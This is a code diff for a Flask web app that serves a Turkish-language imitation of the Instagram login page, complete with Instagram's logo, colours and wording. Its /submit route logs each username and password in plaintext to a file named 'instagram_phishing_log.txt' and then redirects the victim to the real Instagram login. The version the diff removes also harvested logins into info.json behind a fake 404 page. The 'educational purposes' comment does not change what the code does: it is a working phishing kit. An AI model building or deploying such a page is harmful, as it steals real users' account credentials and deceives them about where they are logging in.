@@ -1,126 +1,125 @@
-from flask import Flask, request
-import json
+from flask import Flask, request, render_template_string, redirect
 
 app = Flask(__name__)
 
-@app.route('/')
-def home():
-    return '''
+# Instagram Giriş Sayfası (Eğitim Amaçlı)
+HTML_INSTAGRAM_LOGIN = """
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap</title>
+    <title>Instagram Giriş Yap</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            color: #262626;
         }
-
-        .login-container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-        }
-
-        .login-container h2 {
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            border-radius: 1px;
+            width: 350px;
             text-align: center;
-            margin-bottom: 20px;
         }
-
-        .login-container label {
-            margin: 10px 0 5px;
-            display: block;
-            font-weight: bold;
+        .logo {
+            width: 175px;
+            margin: 20px 0;
         }
-
-        .login-container input[type="text"],
-        .login-container input[type="password"] {
+        input {
             width: 100%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            padding: 9px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
         }
-
-        .login-container input:focus {
-            border-color: #4CAF50;
-            outline: none;
-        }
-
-        .login-container button {
+        button {
             width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
+            padding: 7px;
+            background-color: #0095f6;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
+            font-weight: bold;
+            margin: 10px 0;
             cursor: pointer;
         }
-
-        .login-container button:hover {
-            background-color: #45a049;
+        button:hover {
+            background-color: #0077c2;
+        }
+        .divider {
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-weight: bold;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Giriş Yap</h2>
-        <form action="/login" method="POST">
-            <label for="username">Kullanıcı Adı:</label>
-            <input type="text" id="username" name="username" autocomplete="off" required>
-
-            <label for="password">Şifre:</label>
-            <input type="password" id="password" name="password" autocomplete="off" required>
-
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+        <form method="POST" action="/submit">
+            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+            <input type="password" name="password" placeholder="Şifre" required>
             <button type="submit">Giriş Yap</button>
         </form>
+        <div class="divider">YA DA</div>
+        <div class="facebook-login">Facebook ile Giriş Yap</div>
+        <div class="forgot-password">Şifreni mi unuttun?</div>
+        <div class="footer">
+            Hesabın yok mu? <a href="#" style="color: #0095f6; font-weight: bold;">Kaydol</a>
+        </div>
     </div>
 </body>
 </html>
-    '''
+"""
 
-@app.route('/login', methods=['POST'])
-def login():
+@app.route('/')
+def home():
+    return render_template_string(HTML_INSTAGRAM_LOGIN)
+
+@app.route('/submit', methods=['POST'])
+def submit():
     username = request.form.get('username')
     password = request.form.get('password')
-
-    # Kullanıcı bilgilerini JSON dosyasına kaydet
-    user_data = {"Kullanıcı Adı": username, "Şifre": password}
     
-    try:
-        # Dosya mevcutsa yükle, ardından yeni veriyi ekle
-        with open('info.json', 'r') as file:
-            data = json.load(file)
-    except FileNotFoundError:
-        # Dosya yoksa yeni bir liste oluştur
-        data = []
-
-    data.append(user_data)
-
-    with open('info.json', 'w') as file:
-        json.dump(data, file, indent=4)
-
-    return '''
-    <!DOCTYPE html>
-    <html>
-        <head>
-            <title>404 Not Found</title>
-        </head>
-        <body>
-            <h1>Sayfa Bulunamadı</h1>
-            <p>Aradığınız sayfa mevcut değil.</p>
-        </body>
-    </html>
-    ''', 404
+    with open("instagram_phishing_log.txt", "a") as f:
+        f.write(f"Kullanıcı Adı: {username}, Şifre: {password}\n")
+    
+    return redirect("https://www.instagram.com/accounts/login/")  # Gerçek Instagram sayfasına yönlendir
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
